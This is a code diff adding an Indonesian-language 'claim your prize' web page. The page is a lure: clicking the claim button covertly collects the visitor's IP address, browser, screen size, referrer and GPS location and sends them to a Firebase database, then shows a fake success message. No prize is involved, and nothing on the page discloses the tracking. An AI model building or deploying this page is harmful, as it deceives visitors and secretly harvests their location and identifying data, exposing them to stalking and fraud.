@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Klaim Hadiah Anda!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+      background-color: #f5f5f5;
+    }
+    .container {
+      background: white;
+      border-radius: 10px;
+      padding: 20px;
+      max-width: 500px;
+      margin: 0 auto;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    button {
+      background: #4285f4;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🎉 Selamat! Anda Mendapat Hadiah! 🎉</h1>
+    <p>Klik tombol di bawah untuk mengklaim hadiah Anda</p>
+    <button id="claim-btn">KLAIM HADIAH SEKARANG</button>
+    <div id="success-message" class="hidden">
+      <h2>Hadiah Berhasil Diklaim!</h2>
+      <p>Terima kasih telah berpartisipasi</p>
+    </div>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";
+    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyCUbRuOhKQczZiRJXZe2DLZv4Z_57GsmzI",
+      authDomain: "hadiah-hp-1b70e.firebaseapp.com",
+      projectId: "hadiah-hp-1b70e",
+      storageBucket: "hadiah-hp-1b70e.firebasestorage.app",
+      messagingSenderId: "359910371794",
+      appId: "1:359910371794:web:3d52f0bce715611443580b",
+      measurementId: "G-9E918YTLF0"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    document.getElementById('claim-btn').addEventListener('click', async () => {
+      const btn = document.getElementById('claim-btn');
+      btn.disabled = true;
+      btn.textContent = "Memproses...";
+      
+      // Kumpulkan data
+      const trackingData = {
+        timestamp: new Date().toISOString(),
+        ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()),
+        userAgent: navigator.userAgent,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        referrer: document.referrer || 'direct'
+      };
+
+      // Coba dapatkan lokasi
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            trackingData.gps = {
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude,
+              accuracy: pos.coords.accuracy
+            };
+            saveData(trackingData);
+          },
+          (err) => {
+            console.warn("Geolocation error:", err);
+            saveData(trackingData);
+          }
+        );
+      } else {
+        saveData(trackingData);
+      }
+    });
+
+    async function saveData(data) {
+      try {
+        const trackingRef = ref(db, 'trackingData');
+        await push(trackingRef, data);
+        
+        document.getElementById('claim-btn').classList.add('hidden');
+        document.getElementById('success-message').classList.remove('hidden');
+      } catch (error) {
+        console.error("Error saving data:", error);
+        alert("Terjadi kesalahan, silakan coba lagi");
+        document.getElementById('claim-btn').disabled = false;
+        document.getElementById('claim-btn').textContent = "KLAIM HADIAH SEKARANG";
+      }
+    }
+  </script>
+</body>
+</html>
